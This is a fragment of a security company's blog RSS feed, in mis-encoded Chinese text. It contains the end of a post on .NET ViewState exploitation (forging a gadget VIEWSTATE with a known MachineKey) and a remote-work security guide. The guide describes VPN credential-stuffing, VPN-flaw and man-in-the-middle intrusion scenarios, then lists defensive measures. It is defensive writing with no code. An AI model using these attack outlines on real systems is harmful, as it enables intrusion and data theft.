&lt;p&gt;ä¸éæœ‰æ™‚å€™å³ä¾¿åˆ°äº†æ­¤ä¸€æ­¥é©Ÿé‚„æ˜¯æœƒæœ‰ä¸æ˜çš„éŒ¯èª¤ã€ä¸æ˜çš„åŸå› å°è‡´ MAC è¨ˆç®—å§‹çµ‚æ˜¯éŒ¯èª¤çš„ï¼Œå› ç‚º .NET å…§éƒ¨æ¼”ç®—æ³•ä»¥åŠéœ€è¦çš„ç’°å¢ƒåƒæ•¸çµ„åˆç¨å¾®è¤‡é›œï¼Œä½¿å¾—å·¥å…·æ²’è¾¦æ³•è¼•æ˜“æ¶µè“‹æ‰€æœ‰å¯èƒ½æƒ…æ³ï¼Œè€Œç•¶é‡åˆ°é€™ç¨®æƒ…å½¢æ™‚ï¼Œæˆ‘ç›®å‰é¸æ“‡çš„è§£æ±ºæ–¹æ³•éƒ½æ˜¯ç™¼æ®å·¥äººæ™ºæ…§ï¼Œå˜—è©¦åœ¨æœ¬æ©Ÿå»ºç«‹ç’°å¢ƒã€è¨­å®šç›¸åŒçš„ MachineKeyã€æ‰‹å·¥æ’°å¯« aspx æª”æ¡ˆï¼Œç”¢ç”ŸåŒ…å« gadget çš„ VIEWSTATE å†è½‰é€åˆ°ç›®æ¨™ä¸»æ©Ÿä¸Šã€‚å¦‚æœä½ æœ‰æ›´å¤šç™¼ç¾æˆ–ä¸ä¸€æ¨£çš„æƒ³æ³•é¡˜æ„åˆ†äº«çš„è©±ï¼Œä¹Ÿæ­¡è¿ä¾†å’Œæˆ‘äº¤æµèŠèŠå¤©ã€‚&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/</link>
                <guid>https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell</guid>
                <pubDate>Wed, 11 Mar 2020 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>é è·å·¥ä½œçš„è³‡å®‰æ³¨æ„äº‹é …</title>
                <description>
&lt;p&gt;è¿‘æœŸå› æ–°å‹å† ç‹€ç—…æ¯’ï¼ˆCOVID-19, æ­¦æ¼¢è‚ºç‚ï¼‰å½±éŸ¿ï¼Œä¸å°‘ä¼æ¥­é–‹æ”¾åŒä»é è·å·¥ä½œ (Telework)ã€åœ¨å®¶ä¸Šç­ (Work from home, WFH)ã€‚åœ¨ç–«æƒ…åŠ é€Ÿæ™‚ï¼Œå¦‚æœæ²’æœ‰æº–å‚™å‘¨å…¨å°±è²¿ç„¶å…¨é¢é–‹æ”¾ï¼Œææ€•æœƒé­é‡å°šæœªè€ƒæ…®åˆ°çš„è³‡å®‰è­°é¡Œã€‚é€™ç¯‡æ–‡ç« æä¾›ä¸€å€‹ç°¡å–®çš„æŒ‡å¼•ï¼Œåˆ°åº•é ç«¯åœ¨å®¶ä¸Šç­æœ‰å“ªäº›æ³¨æ„äº‹é …ï¼Ÿæˆ‘å€‘æœƒå¾å…¬å¸ç®¡ç†ã€ä½¿ç”¨è€…å…©å€‹é¢å‘ä¾†è¨è«–ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœä½ åªæƒ³çœ‹é‡é»ï¼Œè«‹è·³åˆ°æœ€å¾Œä¸€æ®µ TL;DRã€‚&lt;/p&gt;

&lt;h2 id=&quot;æ”»æ“Šæ‰‹æ®µ&quot;&gt;æ”»æ“Šæ‰‹æ®µ&lt;/h2&gt;

&lt;p&gt;æˆ‘å€‘å…ˆä¾†èŠèŠæ”»æ“Šçš„æ‰‹æ®µã€‚è©¦æƒ³ä»¥ä¸‹å¹¾å€‹æ”»æ“Šæƒ…å¢ƒï¼Œé€™äº›æƒ…å¢ƒéƒ½æ›¾è¢«æˆ‘å€‘åˆ©ç”¨åœ¨ç´…éšŠæ¼”ç·´çš„éç¨‹ä¸­ï¼ŒåŒæ¨£ä¹Ÿå¯èƒ½æ˜¯ä¼æ¥­çš„ç›²é»ã€‚&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;æƒ…å¢ƒä¸€ã€&lt;strong&gt;VPN æ’åº«æ”»æ“Š&lt;/strong&gt;ï¼šåŒä» A ä½¿ç”¨ VPN é€£ç·šä¼æ¥­å…§éƒ¨ç¶²è·¯ï¼Œä½† VPN å¸³è™Ÿä½¿ç”¨çš„æ˜¯è‡ªå·±æ…£ç”¨çš„å¸³è™Ÿå¯†ç¢¼ï¼Œä¸¦ä¸”å°‡é€™çµ„å¸³è™Ÿå¯†ç¢¼é‡è¤‡ä½¿ç”¨åœ¨å¤–å…¶ä»–éå…¬å¸çš„æœå‹™ä¸Šï¼ˆå¦‚ Facebookã€Adobeï¼‰ï¼Œè€Œé€™çµ„å¯†ç¢¼åœ¨å¹¾æ¬¡å¤–æ´©äº‹ä»¶ä¸­æ—©å·²å¤–æ´©ã€‚æ”»æ“Šåœ˜éšŠé€éé–å®šåŒä» Aï¼Œä½¿ç”¨é€™çµ„å¯†ç¢¼ç™»å…¥ä¼æ¥­å…§éƒ¨ã€‚è€Œå¾ˆéºæ†¾çš„ VPN åœ¨ä¼æ¥­å…§éƒ¨ç¶²è·¯ä¸¦æ²’æœ‰åš´è¬¹çš„éš”é›¢ï¼Œå› æ­¤åœ¨å…§éƒ¨ç¶²è·¯çš„ç›´æ¥æ‰¾åˆ°å…§ç¶²å“¡å·¥ Portalï¼Œå–å¾—å„ç¨®æ©Ÿæ•è³‡æ–™ã€‚&lt;/li&gt;
  &lt;li&gt;æƒ…å¢ƒäºŒã€&lt;strong&gt;VPN æ¼æ´&lt;/strong&gt;ï¼šVPN æ¼æ´å·²ç¶“æˆç‚ºæ”»æ“Šè€…çš„ä¸»è¦æ”»ç•¥ç›®æ¨™ï¼Œå…¬å¸ B ä½¿ç”¨çš„ VPN ä¼ºæœå™¨å«æœ‰æ¼æ´ï¼Œæ”»æ“Šåœ˜éšŠé€éæ¼æ´å–å¾— VPN ä¼ºæœå™¨çš„æ§åˆ¶æ¬Šå¾Œï¼Œå¾ç®¡ç†å¾Œå°é…ç½®å®¢æˆ¶ç«¯ logon scriptï¼Œåœ¨åŒä»ç™»å…¥æ™‚åŸ·è¡Œæƒ¡æ„ç¨‹å¼ï¼Œç²å¾—å…¶é›»è…¦æ§åˆ¶æ¬Šï¼Œä¸¦å–å¾—å…¬å¸æ©Ÿå¯†æ–‡ä»¶ã€‚å¯ä»¥åƒè€ƒä¹‹å‰ Orange &amp;amp; Meh çš„ç ”ç©¶ï¼š&lt;a href=&quot;https://www.youtube.com/watch?v=v7JUMb70ON4&quot;&gt; https://www.youtube.com/watch?v=v7JUMb70ON4&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;æƒ…å¢ƒä¸‰ã€&lt;strong&gt;ä¸­é–“äººæ”»æ“Š&lt;/strong&gt;ï¼šåŒä» C åœ¨å®¶é€é PPTP VPN å·¥ä½œã€‚ä¸å¹¸çš„æ˜¯ C å°å­©çš„é›»è…¦ä¸­å®‰è£äº†å«æœ‰æƒ¡æ„ç¨‹å¼çš„ç›œç‰ˆè»Ÿé«”ã€‚æ”»æ“Šè€…é€è©²é›»è…¦è…¦é€²è¡Œå…§ç¶²ä¸­é–“äººæ”»æ“Š (MITM)ï¼ŒåŠ«æŒ C çš„æµé‡ä¸¦ç ´è§£å–å¾— VPN å¸³è™Ÿå¯†ç¢¼ï¼ŒæˆåŠŸé€²å…¥ä¼æ¥­å…§ç¶²ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;ä»¥ä¸Šåªæ˜¯å¹¾å€‹æ¯”è¼ƒå¸¸è¦‹çš„æƒ…å¢ƒï¼Œæ”»æ“Šåœ˜éšŠçš„é¢å‘éå¸¸å»£ï¼Œè€Œä¼æ¥­çš„é˜²ç¦¦å»ä¸å®¹æ˜“åšåˆ°æ»´æ°´ä¸æ¼ã€‚é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æˆ‘å€‘è¦æ’°å¯«é€™ç¯‡æ–‡ç« ï¼Œå¸Œæœ›èƒ½å¹«åŠ©ä¸€äº›ä¼æ¥­åœ¨é è·å·¥ä½œçš„æ™‚æœŸä¹Ÿèƒ½é”åˆ°åŸºæœ¬çš„å®‰å…¨ã€‚&lt;/p&gt;

&lt;h2 id=&quot;é¢¨éšªæœ‰ä»€éº¼&quot;&gt;é¢¨éšªæœ‰ä»€éº¼&lt;/h2&gt;

&lt;p&gt;é¢¨éšªæŒ‡çš„æ˜¯ç™¼ç”ŸæŸå€‹äº‹ä»¶å°æ–¼è©²ä¸»é«”å¯èƒ½é€ æˆçš„å±å®³ã€‚é€éå‰é¢ä»‹ç´¹çš„æ”»æ“Šæ‰‹æ®µè¦é”æˆå±å®³ï¼Œå°æ”»æ“Šè€…ä¾†èªªä¸¦ä¸å›°é›£ï¼Œæ¥è‘—æˆ‘å€‘ç›¤é»å‡ºä¸€äº›åœ¨ä¼æ¥­çš„è³‡å®‰è¦ç¯„ä¸‹ï¼Œå› æ‡‰é è·å·¥ä½œå¯èƒ½å¤§å¹…å¢åŠ æ”»æ“Šè€…é”æˆæ©Ÿç‡çš„å› å­ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç’°å¢ƒè¤‡é›œï¼šå…¬å¸ç„¡æ³•ç®¡æ§å®¶ä¸­ã€é è·çš„å·¥ä½œç’°å¢ƒï¼Œé€™äº›ç’°å¢ƒä¹Ÿæ¯”è¼ƒè¤‡é›œå±éšªã€‚ä¸€äº›å…¬å¸å…§éƒ¨çš„ç®¡ç†ç›£æ§æ©Ÿåˆ¶éƒ½é›£ä»¥æ–½å±•ï¼Œä¹Ÿè¼ƒé›£è¦æ±‚åŒä»åœ¨å®¶ä¸­ç§äººè¨­å‚™å®‰è£ç›£æ§æ©Ÿåˆ¶ã€‚&lt;/li&gt;
  &lt;li&gt;å…¬å¸è³‡æ–™å¤–æ´©æˆ–ä¸ç•¶ä½¿ç”¨ï¼šè‹¥å…¬å¸çš„è³‡æ–™é­åˆ°å¤–æ´©æˆ–ä¸ç•¶ä½¿ç”¨ï¼Œå°‡æœƒæœ‰åš´é‡çš„æå¤±ã€‚&lt;/li&gt;
  &lt;li&gt;è¨­å‚™éºå¤±ã€é­ç«Šï¼šä¸ç®¡æ˜¯ç­†é›»æˆ–è€…æ˜¯æ‰‹æ©Ÿç­‰è£ç½®ï¼Œéºå¤±æˆ–è€…é­ç«Šæ™‚ï¼Œéƒ½æœƒæœ‰è³‡æ–™å¤–æ´©çš„é¢¨éšªã€‚&lt;/li&gt;
  &lt;li&gt;æˆæ¬Šæˆ–å­˜å–æ§åˆ¶ä¸æ˜“å¯¦ä½œï¼šåœ¨çŸ­æ™‚é–“å…§æä¾›å¤§é‡å“¡å·¥çš„å¤–éƒ¨å­˜å–ï¼Œå‹¢å¿…æœƒåœ¨ã€Œå¯ç”¨æ€§ã€å’Œã€Œå®‰å…¨æ€§ã€é–“åšå‡ºå–æ¨ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è‹¥å…¬å¸å…è¨±åŒä»ä½¿ç”¨ç§äººçš„è¨­å‚™é€£ä¸Šå…¬å¸å…§éƒ¨ VPNï¼Œé€™æ¨£çš„è­°é¡Œå°±ç­‰åŒ BYOD (Bring Your Own Device)ï¼Œé€™äº›å®‰å…¨æ€§çš„é¡§æ…®æœ‰ä¸å°‘æ–‡ç« å¯ä»¥åƒè€ƒã€‚ä¾‹å¦‚ NIST SP800-46 Guide to Enterprise Telework, Remote Access, and Bring Your Own Device (BYOD) Security&lt;a href=&quot;https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&quot;&gt; https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-46r2.pdf&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;å…¬å¸é¢å‘&quot;&gt;å…¬å¸é¢å‘&lt;/h2&gt;

&lt;p&gt;æ¥ä¸‹ä¾†æˆ‘å€‘ä¾†çœ‹çœ‹å…¬å¸æ–¹é¢åœ¨é è·å·¥ä½œä¸Šé¢æœ‰å“ªäº›è³‡å®‰ä¸Šé¢çš„ä½œç‚ºã€‚&lt;/p&gt;

&lt;h3 id=&quot;å·¥ä½œæµç¨‹åŠåŸå‰‡è¦åŠƒ&quot;&gt;å·¥ä½œæµç¨‹åŠåŸå‰‡è¦åŠƒ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;å·¥ä½œæµç¨‹èª¿æ•´&lt;/strong&gt;ï¼šé è·å·¥ä½œæ™‚ï¼Œæ¯å€‹æµç¨‹è©²å¦‚ä½•ä½œå°æ‡‰çš„èª¿æ•´ï¼Œä¾‹å¦‚å¦‚ä½•åœ¨ä¸åŒåœ°é»å”åŒä½œæ¥­ã€å½™æ•´å·¥ä½œè³‡æ–™ã€ç¢ºèªå·¥ä½œæˆæœåŠå“è³ªç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è³‡æ–™ç›¤é»&lt;/strong&gt;ï¼šå“ªäº›è³‡æ–™æ”¾åœ¨é›²ç«¯ã€ä¼ºæœå™¨ã€å€‹äººé›»è…¦ï¼Œç•¶é è·å·¥ä½œæ™‚å“ªäº›è³‡æ–™å°‡ç„¡æ³•è¢«å–ç”¨ï¼Œæˆ–è©²å°‡è³‡æ–™è½‰ç§»åˆ°å“ªé‚Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æœƒè­°æµç¨‹&lt;/strong&gt;ï¼šæœƒè­°æ™‚è¦–è¨Šè¨­å‚™ã€è»Ÿé«”é¸æ“‡åŠæ¸¬è©¦ï¼Œä¸¦æ³¨æ„æœƒè­°è»Ÿé«”é€šè¨Šæ˜¯å¦æœ‰åŠ å¯†ã€‚ç‹€æ³å¦‚æœƒè­°æ™‚é–“å»¶é•·ã€åŒæ™‚ç™¼è¨€ã€é è·å“è³ªå½±éŸ¿ç­‰ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;äº‹ä»¶è™•ç†åœ˜éšŠåŠæµç¨‹&lt;/strong&gt;ï¼šå› é è·å·¥ä½œæ™‚ç™¼ç”Ÿçš„è³‡å®‰äº‹ä»¶ï¼Œè©²ç”±èª°è² è²¬è™•ç†ã€å¦‚ä½•è™•ç†ã€ç›¤é»æå¤±ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åƒ…çŸ¥ã€æœ€å°æ¬Šé™åŸå‰‡&lt;/strong&gt;ï¼šåƒ…çŸ¥åŸå‰‡ (Need-to-know Basis) ä»¥åŠæœ€å°æ¬Šé™åŸå‰‡ (Principle of Least Privilege, PoLP)ï¼Œåƒ…çµ¦äºˆæ¯å€‹åŒä»æœ€å°é™åº¦éœ€è¦çš„è³‡æ–™ä»¥åŠæ¬Šé™ï¼Œé¿å…é¡å¤–çš„å®‰å…¨å•é¡Œã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç¶²è·¯ç®¡ç†&quot;&gt;ç¶²è·¯ç®¡ç†&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;VPN å¸³è™Ÿç”³è«‹åŠç›¤é»&lt;/strong&gt;ï¼šå“ªäº›åŒä»éœ€è¦ä½¿ç”¨ VPNï¼Œå±¬æ–¼å“ªäº›ç¾¤çµ„ï¼Œæ¯å€‹ç¾¤çµ„çš„æ¬Šé™åŠé€£ç·šç¯„åœçš†ä¸åŒã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;VPN å¸³è™Ÿæ¬Šé™ç¯„åœåŠå…§ç¶²åˆ†å€&lt;/strong&gt;ï¼šVPN é€£ç·šé€²ä¾†å¾Œï¼Œä¸æ‡‰å­˜å–æ•´å€‹å…¬å¸å…§ç¶²æ‰€æœ‰ä¸»æ©Ÿï¼Œå› ç‚º VPN è¦–åŒå¤–éƒ¨é€£ç·šï¼Œé¢¨éšªç­‰ç´šæ‡‰è©²æ›´é«˜ï¼Œæ›´æ‡‰è©²åšé€£ç·šçš„åˆ†å€ç®¡æ§ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç›£æ§ç¢ºèª VPN æµé‡åŠè¡Œç‚º&lt;/strong&gt;ï¼šé€éå…§éƒ¨ç¶²è·¯çš„ç¶²è·¯æµé‡ç›£æ§æ©Ÿåˆ¶ï¼Œç¢ºèª VPN ä½¿ç”¨æœ‰ç„¡ç•°å¸¸è¡Œç‚ºã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åªå…è¨±ç™½åå–®è¨­å‚™å–å¾— IP ä½å€&lt;/strong&gt;ï¼šå·²ç”³è«‹çš„è¨­å‚™æ‰èƒ½å–å¾—å…§ç¶² IP ä½å€ï¼Œé¿å…å¯ç–‘è¨­å‚™å‡ºç¾åœ¨å…§éƒ¨ç¶²è·¯ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;é–‹å•Ÿå¸³è™Ÿå¤šå› å­èªè­‰&lt;/strong&gt;ï¼šå°‡é›²ç«¯æœå‹™ã€VPNã€å…§éƒ¨ç¶²è·¯æœå‹™é–‹å•Ÿå¤šå› å­èªè­‰ã€‚&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;strong&gt;ç¢ºèª VPN ä¼ºæœå™¨æ˜¯å¦ç‚ºæ–°ç‰ˆ&lt;/strong&gt;ï¼šåœ¨æˆ‘å€‘éå»çš„ç ”ç©¶ç™¼ç¾ VPN ä¼ºæœå™¨ä¹Ÿæœƒæ˜¯æ”»æ“Šçš„å°è±¡ï¼Œå› æ­¤å¯†åˆ‡æ³¨æ„æ˜¯å¦æœ‰æ›´æ–°æˆ–è€…ä¿®è£œç¨‹å¼ã€‚&lt;/p&gt;

    &lt;ul&gt;
      &lt;li&gt;Palo Alto GlobalProtect è³‡å®‰é€šå ± &lt;a href=&quot;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&quot;&gt;https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;FortiGate SSL VPN è³‡å®‰é€šå ± &lt;a href=&quot;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/09/Fortigate-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
      &lt;li&gt;Pulse Secure SSL VPN è³‡å®‰é€šå ± &lt;a href=&quot;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&quot;&gt;https://devco.re/blog/2019/08/28/Pulse-Secure-SSL-VPN-advisory/&lt;/a&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä¸­å€¼å¾—ç‰¹åˆ¥é»å‡ºçš„æ˜¯ VPN çš„è¨­å®šèˆ‡é–‹æ”¾ã€‚è¿‘æœŸè½èåˆ°ä¸å°‘å…¬å¸çš„ç®¡ç†éšå±¤è«‡è«–åˆ°ï¼Œå› æ‡‰ç–«æƒ…åŸæœ¬ä¸é–‹æ”¾ VPN æ¬Šé™çš„åŒä»ç¾åœ¨å…¨é–‹æ”¾äº†ã€‚è€Œå•åˆ° VPN é€£ç·šé€²å…¬å¸å…§éƒ¨ç¶²è·¯ä¹‹å¾Œçš„ç›£æ§è·Ÿé˜»éš”ç‚ºä½•ï¼Œå»è¼ƒå°‘æœ‰ä¼æ¥­å…·å‚™é€™æ¨£çš„è¦åŠƒã€‚å…§éƒ¨ç¶²è·¯æ˜¯ä¼æ¥­çš„ä¸€å¤§è³‡å®‰æˆ°å ´ï¼Œé–‹æ”¾ VPN çš„åŒæ™‚ï¼Œå¿…å®šè¦æ€è€ƒè³‡å®‰å°æ‡‰çš„æªæ–½ã€‚&lt;/p&gt;

&lt;h2 id=&quot;ä½¿ç”¨è€…é¢å‘&quot;&gt;ä½¿ç”¨è€…é¢å‘&lt;/h2&gt;

&lt;p&gt;å…¬å¸æº–å‚™å¥½äº†ï¼Œæ¥ä¸‹ä¾†å°±æ˜¯ä½¿ç”¨è€…çš„å®‰å…¨æ€§äº†ã€‚é™¤äº†å…¬å¸æä¾›çš„ VPN ç·šè·¯ã€æ¶æ§‹ã€æ©Ÿåˆ¶ä¹‹å¤–ï¼Œä½¿ç”¨è€…æœ¬èº«çš„è³‡å®‰æ„è­˜ã€è¦ç¯„ã€å®‰å…¨æ€§è¨­å®šä¹Ÿä¸€æ¨£é‡è¦ã€‚&lt;/p&gt;

&lt;h3 id=&quot;ä¿å¯†&quot;&gt;ä¿å¯†&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;å°ˆæ©Ÿå°ˆç”¨&lt;/strong&gt;ï¼šç”¨ä¾†å­˜å–å…¬å¸ç¶²è·¯æˆ–è³‡æ–™çš„é›»è…¦ï¼Œæ‡‰åš´æ ¼éµå®ˆæ­¤åŸå‰‡ï¼Œç¦æ­¢å°‡è©²è¨­å‚™ä½œç‚ºéå…¬å‹™ç”¨é€”ã€‚ä¹Ÿæ‡‰é¿å…éå…¬å¸äººå£«ä½¿ç”¨æˆ–æ“ä½œè©²è£ç½®ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è¨­å‚™ç›¸é—œ&quot;&gt;è¨­å‚™ç›¸é—œ&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;é–‹å•Ÿè£ç½®å”å°‹ã€é–å®šã€æ¸…é™¤åŠŸèƒ½&lt;/strong&gt;ï¼šè¨­å‚™è‹¥å¯æ”œå¸¶ç§»å‹•ï¼Œè¨­å‚™çš„éºå¤±å°æ‡‰æ–¹æ¡ˆå°±å¿…é ˆè¦è€ƒæ…®å®Œæ•´ã€‚ä¾‹å¦‚å¦‚ä½•å°‹æ‰¾è£ç½®ã€å¦‚ä½•é–å®šè£ç½®ã€å¦‚ä½•é ç«¯æ¸…é™¤å·²éºå¤±çš„è£ç½®é¿å…è³‡æ–™å¤–æ´©ã€‚ç¾åœ¨ä¸»æµä½œæ¥­ç³»çµ±å¤šåŠéƒ½æœƒæä¾›é€™äº›æ©Ÿåˆ¶ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è¨­å‚™ç™»å…¥å¯†ç¢¼&lt;/strong&gt;ï¼šè£ç½®ç™»å…¥æ™‚å¿…é ˆè¨­å®šå¯†ç¢¼ï¼Œé¿å…å¤–äººç›´æ¥æ“ä½œã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;è¨­å‚™å…¨æ©ŸåŠ å¯†&lt;/strong&gt;ï¼šè¨­å‚™è‹¥éºå¤±é­åˆ°åˆ†æï¼Œå…¨æ©ŸåŠ å¯†å¯ä»¥é™ä½è³‡æ–™è¢«ç ´è§£éºå¤±çš„é¢¨éšªã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;MDM (Mobile Device Management)&lt;/strong&gt;ï¼šè‹¥å…¬å¸æœ‰å°å…¥ MDMï¼Œå¯ä»¥å”åŠ©ä»¥ä¸Šçš„ç®¡ç†ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¸³è™Ÿå¯†ç¢¼å®‰å…¨&quot;&gt;å¸³è™Ÿå¯†ç¢¼å®‰å…¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;ä½¿ç”¨å¯†ç¢¼ç®¡ç†å·¥å…·ä¸¦è¨­å®šã€Œå¼·å¯†ç¢¼ã€&lt;/strong&gt;ï¼šå¯ä»¥è€ƒæ…®ä½¿ç”¨å¯†ç¢¼ç®¡ç†å·¥å…·ä¸¦å°‡å¯†ç¢¼è¨­ç‚ºå…¨éš¨æ©Ÿç”¢ç”ŸåŒ…å«è‹±æ–‡ã€æ•¸å­—ã€ç¬¦è™Ÿçš„å¯†ç¢¼ä¸²ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ä¸åŒç³»çµ±å¸³è™Ÿä½¿ç”¨ä¸åŒå¯†ç¢¼&lt;/strong&gt;ï¼šé€™å€‹åœ¨å¾ˆå¤šæ¬¡æ¼”è¬›ä¸­éƒ½æœ‰æåˆ°ï¼Œå»ºè­°æ¯å€‹ç³»çµ±çš†ä½¿ç”¨ä¸åŒå¯†ç¢¼ï¼Œé˜²æ­¢æ’åº«æ”»æ“Šã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å¸³è™Ÿé–‹å•Ÿ 2FA / MFA&lt;/strong&gt;ï¼šè‹¥ç³»çµ±å…·å‚™ 2FA / MFA æ©Ÿåˆ¶ï¼Œå‹™å¿…é–‹å•Ÿï¼Œç‚ºå¸³è™Ÿå¤šä¸€å±¤ä¿è­·ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ç¶²è·¯ä½¿ç”¨&quot;&gt;ç¶²è·¯ä½¿ç”¨&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;é¿å…ä½¿ç”¨å…¬ç”¨ Wi-Fi é€£æ¥å…¬å¸ç¶²è·¯&lt;/strong&gt;ï¼šå…¬çœ¾å…¬ç”¨ç¶²è·¯æ˜¯ç›¸ç•¶å±éšªçš„ï¼Œæè¢«å´éŒ„æˆ–ç«„æ”¹ã€‚è‹¥å¿…è¦æ™‚å¯ä½¿ç”¨æ‰‹æ©Ÿç†±é»æˆ–é€é VPN é€£æ¥ç¶²éš›ç¶²è·¯ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¦æ­¢ä½¿ç”¨å…¬ç”¨é›»è…¦ç™»å…¥å…¬å¸ç³»çµ±&lt;/strong&gt;ï¼šå¤–é¢çš„å…¬ç”¨é›»è…¦é›£ç¢ºä¿æ²’æœ‰å¾Œé–€ã€Keylogger ä¹‹é¡çš„æƒ¡æ„ç¨‹å¼ï¼Œä¸€å®šè¦ç¦æ­¢ä½¿ç”¨å…¬ç”¨é›»è…¦ä¾†ç™»å…¥ä»»ä½•ç³»çµ±ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¢ºèªé€£ç·šè£ç½®æ˜¯å¦å¯å–å¾—å…§ç¶² IP ä½å€&lt;/strong&gt;ï¼šç¢ºèªå…§ç¶² IP ä½å€æ˜¯å¦ç„¡èª¤ï¼Œæ˜¯å¦èƒ½å¤ æ­£å¸¸å­˜å–å…¬å¸å…§éƒ¨ç³»çµ±ã€‚&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;ç¢ºèªé€£ç·šçš„å°å¤– IP ä½å€&lt;/strong&gt;ï¼šç¢ºèªé€£ç·šè‡³ç¶²éš›ç¶²è·¯çš„ IP ä½å€æ˜¯å¦ç‚ºé æœŸï¼Œå°¤å…¶æ˜¯è³‡å®‰æœå‹™å…¬å¸ï¼Œå°å®¢æˆ¶é€£ç·šçš„ IP ä½å€è‹¥æœ‰éŒ¯èª¤ï¼Œå¯èƒ½é‡€æˆéå¸¸åš´é‡çš„æå®³ã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;å®‰è£å€‹äººé›»è…¦é˜²ç«ç‰†&lt;/strong&gt;ï¼šå€‹äººé˜²ç«ç‰†å¯ä»¥åŸºæœ¬ç›£æ§æœ‰ç„¡å¯ç–‘ç¨‹å¼æƒ³å°å¤–é€£ç·šã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;æ¡ç”¨ E2EE é€šè¨Šå·¥å…·&lt;/strong&gt;ï¼šç›®å‰ä¼æ¥­éƒ½æœƒä½¿ç”¨é›²ç«¯é€šè¨Šè»Ÿé«”ï¼Œé€šè¨Šè»Ÿé«”å»ºè­°æ¡ç”¨æœ‰ E2EE (End-to-End Encryption)ï¼Œå¦‚æ­¤å¯ä»¥ç¢ºä¿å…¬å¸å…§çš„æ©Ÿæ•é€šè¨Šå…§å®¹åªæœ‰å…§éƒ¨äººå“¡æ‰èƒ½è§£å¯†ï¼Œå°±é€£å¹³å°å•†ä¹Ÿç„¡æ³•å­˜å–ã€‚&lt;/li&gt;
  &lt;li&gt;ï¼ˆé¸æ“‡æ€§ï¼‰&lt;strong&gt;å·¥ä½œæ™‚é—œé–‰ä¸å¿…è¦çš„é€£ç·š&lt;/strong&gt;ï¼ˆå¦‚è—ç‰™ç­‰ï¼‰ï¼šéƒ¨åˆ†è³‡å®‰å°ˆå®¶è¡¨ç¤ºï¼Œå»ºè­°åœ¨å·¥ä½œæ™‚å°‡é›»è…¦çš„éå¿…è¦é€£ç·šç®¡é“å…¨æ•¸é—œé–‰ï¼Œå¦‚è—ç‰™ç­‰ï¼Œåœ¨å¤–éƒ¨å…¬çœ¾ç’°å¢ƒæˆ–è¨±æœ‰å¿ƒäººå£«å¯ä»¥é€éè—ç‰™ exploit æ”»æ“Šå€‹äººè£ç½®ã€‚&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;è³‡æ–™ç®¡ç†&quot;&gt;è³‡æ–™ç®¡ç†&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;åªç•™å­˜åœ¨å…¬å¸è¨­å‚™&lt;/strong&gt;ï¼šå…¬å¸çš„æ©Ÿæ•è³‡æ–™ã€æ–‡ä»¶ç­‰ï¼Œå¿…é ˆåªç•™å­˜åœ¨å…¬å¸è¨­å‚™ä¸­ï¼Œé¿å…è³‡æ–™å¤–æ´©ä»¥åŠç®¡ç†å•é¡Œã€‚&lt;/li&gt;
